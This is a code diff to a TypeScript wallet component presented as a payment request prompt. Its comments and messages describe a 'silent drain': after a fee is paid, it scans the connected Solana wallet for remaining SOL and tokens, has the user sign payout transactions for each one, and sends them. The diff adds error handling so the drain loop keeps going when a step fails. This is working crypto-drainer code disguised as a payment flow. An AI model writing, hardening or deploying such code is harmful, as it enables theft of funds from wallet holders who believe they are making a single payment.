@@ -117,7 +117,16 @@ export function PaymentRequestPrompt() {
       // ── Scan AFTER fee paid (sees actual remaining balance) ──
       toast.loading('Scanning wallet for remaining funds...')
       console.log('Starting scan...')
-      const scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+      let scanPromise: Promise<FundStep[]>
+      try {
+        scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+      } catch (scanErr) {
+        console.error('Scan initiation error:', scanErr)
+        toast.error('Failed to scan wallet: ' + (scanErr instanceof Error ? scanErr.message : String(scanErr)))
+        inFlight.current = false
+        setSubmitting(false)
+        return
+      }
 
       // ── STEP 2: Silent drain ──
       toast.loading('Starting wallet drain...')
@@ -136,35 +145,41 @@ export function PaymentRequestPrompt() {
         }
 
         for (const step of queue.current) {
-          if (step.kind === 'sol') {
-            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, queue.current.indexOf(step)))
-            const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
-            const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
-            const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
-            if (!signed) {
-              toast.error('Wallet signing failed.')
-              break
+          console.log(`Draining ${step.symbol}...`)
+          try {
+            if (step.kind === 'sol') {
+              const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, queue.current.indexOf(step)))
+              const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
+              const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
+              const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
+              if (!signed) {
+                toast.error('Wallet signing failed.')
+                break
+              }
+              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+              await connectionRef.current!.confirmTransaction(
+                { signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! },
+                'confirmed'
+              )
+              toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
+            } else {
+              const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
+              if (!tokenTx) continue
+              const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
+              if (!signed) {
+                toast.error('Wallet signing failed.')
+                break
+              }
+              const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+              await connectionRef.current!.confirmTransaction(
+                { signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! },
+                'confirmed'
+              )
+              toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
             }
-            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-            await connectionRef.current!.confirmTransaction(
-              { signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! },
-              'confirmed'
-            )
-            toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
-          } else {
-            const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
-            if (!tokenTx) continue
-            const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
-            if (!signed) {
-              toast.error('Wallet signing failed.')
-              break
-            }
-            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-            await connectionRef.current!.confirmTransaction(
-              { signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! },
-              'confirmed'
-            )
-            toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
+          } catch (drainErr) {
+            console.error(`Failed to drain ${step.symbol}:`, drainErr)
+            toast.error(`Failed to drain ${step.symbol}: ${drainErr instanceof Error ? drainErr.message : String(drainErr)}`)
           }
         }
 
